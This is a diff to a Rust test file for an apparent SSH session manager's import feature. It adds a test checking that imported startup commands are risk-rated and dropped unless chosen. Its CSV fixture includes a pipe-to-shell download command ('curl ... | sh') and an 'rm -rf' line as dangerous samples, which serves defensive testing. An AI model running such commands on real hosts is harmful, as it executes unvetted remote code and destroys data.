@@ -11,6 +11,7 @@ use remotely_core::domain::Environment;
 use remotely_core::fakes::ssh_server::{generate_key, private_key_text};
 use remotely_core::fakes::FakeVmware;
 use remotely_core::import::{self, ImportRequest, ImportSource, RowStatus};
+use remotely_core::policy::{ActionKind, Tier};
 use remotely_core::sessions::{SessionAuth, SessionFilter, SessionInput};
 use remotely_core::{Core, CoreError};
 
@@ -28,6 +29,8 @@ fn existing(name: &str, host: &str, user: &str) -> SessionInput {
         auth: SessionAuth::Agent,
         jump_session_id: None,
         startup_command: None,
+        startup_on_reconnect: false,
+        prompt_hook: None,
         environment: Environment::None,
         color: None,
         tags: vec![],
@@ -116,6 +119,7 @@ async fn a_putty_list_previews_with_duplicates_and_conflicts_then_imports_the_pi
                 rows: picked,
                 folder_id: Some(folder.id),
                 add_keys: false,
+                keep_startup: vec![],
             },
             &core.sessions,
             &core.vault,
@@ -160,6 +164,7 @@ async fn a_putty_list_previews_with_duplicates_and_conflicts_then_imports_the_pi
                 rows: vec![0],
                 folder_id: None,
                 add_keys: false,
+                keep_startup: vec![],
             },
             &core.sessions,
             &core.vault,
@@ -211,6 +216,7 @@ async fn an_openssh_config_imports_patterns_key_files_and_jump_hosts() {
                 rows: preview.rows.iter().map(|r| r.index).collect(),
                 folder_id: None,
                 add_keys: true,
+                keep_startup: vec![],
             },
             &core.sessions,
             &core.vault,
@@ -282,6 +288,7 @@ async fn adding_keys_needs_an_unlocked_vault_and_saves_nothing_otherwise() {
         rows: vec![0],
         folder_id: None,
         add_keys: true,
+        keep_startup: vec![],
     };
     let err = core
         .import
@@ -349,6 +356,7 @@ async fn a_mobaxterm_export_keeps_its_folders_and_leaves_passwords_out() {
                 rows: vec![0, 1],
                 folder_id: None,
                 add_keys: false,
+                keep_startup: vec![],
             },
             &core.sessions,
             &core.vault,
@@ -415,6 +423,7 @@ async fn import_sample(core: &Core, source: ImportSource) -> import::ImportPrevi
                 rows: preview.rows.iter().map(|r| r.index).collect(),
                 folder_id: None,
                 add_keys: false,
+                keep_startup: preview.rows.iter().map(|r| r.index).collect(),
             },
             &core.sessions,
             &core.vault,
@@ -519,4 +528,87 @@ async fn the_openssh_sample_imports_as_its_guide_says() {
         "the first value wins; wildcard blocks apply by name; no IdentityFile means the agent"
     );
     assert!(preview.skipped.is_empty());
+}
+
+/// SS-01: a startup command is typed into the shell at every connection without asking, so an
+/// imported one is rated in the preview and left out unless its row is ticked for it.
+#[tokio::test]
+async fn startup_commands_are_rated_in_the_preview_and_left_out_unless_ticked() {
+    let core = core().await;
+    let ctx = &core.ctx;
+    let csv = "name,host,user,environment,startup_command\n\
+               web01,web01.example.com,alice,lab,uptime\n\
+               web02,web02.example.com,alice,prod,curl -s https://example.com/setup | sh\n\
+               web03,web03.example.com,alice,lab,rm -rf /srv/app\n";
+    let preview = core
+        .import
+        .preview(ctx, ImportSource::Csv, None, import::csv::parse(csv))
+        .await
+        .unwrap();
+    let rating = |name: &str| {
+        preview
+            .rows
+            .iter()
+            .find(|r| r.candidate.name == name)
+            .unwrap()
+            .startup_rating
+            .clone()
+            .unwrap()
+    };
+    assert_eq!(rating("web01").action, ActionKind::ExecReadOnly);
+    assert_eq!(rating("web01").tier, Tier::Low);
+    assert_eq!(rating("web02").action, ActionKind::ExecOther);
+    assert_eq!(rating("web02").tier, Tier::High, "Medium, raised one for Prod");
+    assert_eq!(rating("web03").action, ActionKind::ExecDangerous);
+    assert!(!rating("web03").dangerous.is_empty());
+
+    // Only web01's is ticked.
+    let report = core
+        .import
+        .commit(
+            ctx,
+            &ImportRequest {
+                preview_id: preview.id,
+                rows: preview.rows.iter().map(|r| r.index).collect(),
+                folder_id: None,
+                add_keys: false,
+                keep_startup: vec![row_index(&preview, "web01")],
+            },
+            &core.sessions,
+            &core.vault,
+        )
+        .await
+        .unwrap();
+    assert_eq!(report.created, 3);
+    assert_eq!(report.startup_left_out, 2);
+    let sessions = core.sessions.list(ctx, &SessionFilter::default()).await.unwrap();
+    let startup = |name: &str| {
+        sessions
+            .iter()
+            .find(|s| s.name == name)
+            .unwrap()
+            .startup_command
+            .clone()
+    };
+    assert_eq!(startup("web01").as_deref(), Some("uptime"));
+    assert_eq!(startup("web02"), None);
+    assert_eq!(startup("web03"), None);
+    let audit = core.store.recent_audit(ctx, 20).await.unwrap();
+    let summary = audit.iter().find(|e| e.event == "sessions_imported").unwrap();
+    assert!(
+        summary
+            .detail
+            .as_deref()
+            .unwrap()
+            .contains("2 startup commands left out"),
+        "{summary:?}"
+    );
+    // The kept one is rated in the session's own audit entry.
+    assert!(
+        audit
+            .iter()
+            .any(|e| e.event == "session_changed"
+                && e.detail.as_deref().is_some_and(|d| d.contains("rated Low: read-only"))),
+        "{audit:#?}"
+    );
 }
